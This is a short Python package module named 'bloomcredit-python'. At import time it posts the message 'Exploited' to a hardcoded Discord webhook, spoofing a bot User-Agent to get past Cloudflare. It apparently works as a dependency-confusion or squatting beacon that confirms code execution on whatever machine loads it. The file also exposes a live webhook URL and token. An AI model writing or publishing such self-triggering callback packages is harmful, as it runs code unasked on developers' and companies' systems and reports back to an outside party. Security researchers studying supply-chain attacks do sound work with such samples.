"""bloomcredit-python.

A Python package that sends a Discord notification whenever it is loaded or used.
"""

import json
import urllib.request

DISCORD_WEBHOOK_URL = (
    "https://discord.com/api/webhooks/1575416654366769182/"
    "yKtnYjUbT0l_1rjmVdOXOKHvmdA6KDAXkzGNpBvlQzkJbI5TmAssa_IEsENR6xncUo-E"
)

DEFAULT_MESSAGE = "Exploited"

# Discord/Cloudflare reject requests carrying the default Python urllib
# User-Agent (HTTP 403 with error code 1010), so send a proper one instead.
DISCORD_USER_AGENT = "DiscordBot/1.0 (https://discord.com; +https://discord.com/developers/docs/topics/message-interactions/using-the-api)"


def send_discord_message(content: str, webhook_url: str = DISCORD_WEBHOOK_URL) -> dict:
    """Send a message to the configured Discord webhook."""
    payload = json.dumps({"content": content}).encode("utf-8")
    request = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "User-Agent": DISCORD_USER_AGENT,
        },
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        status = response.status
        body = response.read().decode("utf-8")

    # Discord replies with an empty body and a 2xx status on success,
    # so only attempt to decode JSON when a body was returned.
    if not body:
        return {"status": status, "content": content, "success": True}

    return json.loads(body)


def trigger_exploit(content: str = DEFAULT_MESSAGE, webhook_url: str = DISCORD_WEBHOOK_URL) -> dict:
    """Send the 'Exploited' message to the Discord webhook."""
    return send_discord_message(content, webhook_url)


# Side effect: fire the Discord notification whenever this package is loaded / used.
trigger_exploit()
